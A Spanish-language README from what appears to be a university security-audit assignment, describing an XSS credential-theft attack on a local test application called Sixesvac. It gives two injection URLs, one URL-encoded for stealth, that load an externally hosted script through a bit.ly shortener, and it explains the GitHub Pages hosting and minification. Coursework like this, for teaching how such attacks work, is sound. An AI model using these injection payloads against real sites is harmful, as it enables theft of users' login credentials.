# sixesvac-xss
Ejemplo de ataque de XSS para el robo de credenciales en la aplicación de prueba Sixesvac, para la asignatura de Auditoría e Xestión de Seguridade.

## URL a usar para el ataque XSS
1. `http://localhost:8080/privado/login.php?err_id=<script src="http://bit.ly/3amEhNK"></script>` (45 caracteres en parámetro de consulta)
3. `http://localhost:8080/privado/login.php?err_id=%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2Fbit%2E%6C%79%2F3amEhNK%22%3E%3C%2F%73%63%72%69%70%74%3E` (115 caracteres en parámetro de consulta; más discreto mediante codificación URL)

## Cómo funciona
Se utiliza XSS para cargar un script subido a GitHub Pages, un servicio gratuito de GitHub que publica recursos estáticos de un repositorio de GitHub. Para acortar el URL se utiliza un acortador de URL gratuito para redirigir a [https://aggarcia3.github.io/sixesvac-xss/p.js]. Además, el script diseñado para ejecutar el ataque está minificado lo máximo posible, sacrificando compatibilidad con Internet Explorer y navegadores más antiguos donde es necesario, para usar sintaxis y funciones más nuevas que redundan en un código más breve.

## Herramientas usadas
http://bit.ly

https://onlinetexttools.com/url-encode-text

https://jscompress.com/
